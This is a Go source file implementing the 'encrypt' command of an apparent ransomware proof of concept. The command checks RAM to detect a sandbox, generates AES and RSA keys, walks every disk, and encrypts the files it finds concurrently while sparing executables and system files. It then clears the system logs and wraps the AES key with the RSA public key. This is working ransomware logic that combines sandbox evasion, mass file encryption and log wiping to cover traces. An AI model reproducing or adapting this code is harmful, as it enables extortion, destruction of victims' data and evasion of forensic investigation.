package cmd

import (
	"davidlares/golang-ransomware-poc/aes"
	"davidlares/golang-ransomware-poc/encrypt"
	"davidlares/golang-ransomware-poc/layout"
	"davidlares/golang-ransomware-poc/logs"
	"davidlares/golang-ransomware-poc/mapper"
	"davidlares/golang-ransomware-poc/rsa"
	"davidlares/golang-ransomware-poc/sandbox"
	"fmt"
	"strings"

	"github.com/spf13/cobra"
)

var encryptCmd = &cobra.Command{
	Use:   "encrypt",
	Short: "Encrypt function",
	Long:  `Encrypt functionality built with GoLang.`,
	Run: func(cmd *cobra.Command, args []string) {
		sandbox.CheckRAM()
		// detecting the machine layout
		layout.LayoutExist()
		// saving the AES key for later encryption
		aes.SaveKeyFile("aes_key.txt")
		// generating the RSA keys
		rsa.GenerateRSAPubAndPrivateKey("private.pem", "public.pem")
		// encrypt control
		encryptControl := make(chan struct{}, 10)
		// disk
		disks := mapper.ListingDisks()
		// black list implementation
		blackList := []string{".msi", ".exe", ".dll", ".sys", ".ini", ".go", ".pem", ".txt"}
		// looping disks
		for _, disk := range disks {
			files := mapper.MapFiles(disk, blackList)
			for _, file := range files {
				// evaluating suffix and skipping
				if strings.HasSuffix(file, ".enc") {
					continue
				}
				// adding to waitgroup
				mapper.Wg.Add(1)
				// encrypt control
				encryptControl <- struct{}{}
				// calling the function (anon)
				go func(f string) {
					go encrypt.EncryptWithXorAndAES(file, "aes_key.txt", encryptControl)
				}(file)
			}
		}
		// then
		mapper.Wg.Wait()
		fmt.Println("[Finalizing] encrypted files")
		// clearing the logs
		logs.ClearLogs()
		fmt.Println("Logs deleted")
		// encrypting RSA w/ AES
		rsa.RSAEncryptionWithAES("public.pem", "aes_key.txt")
		fmt.Println("AES key encrypted with RSA public key")
	},
}

// adding child commands to the encrypt command (= flags)
func init() {
	rootCmd.AddCommand(encryptCmd)
}
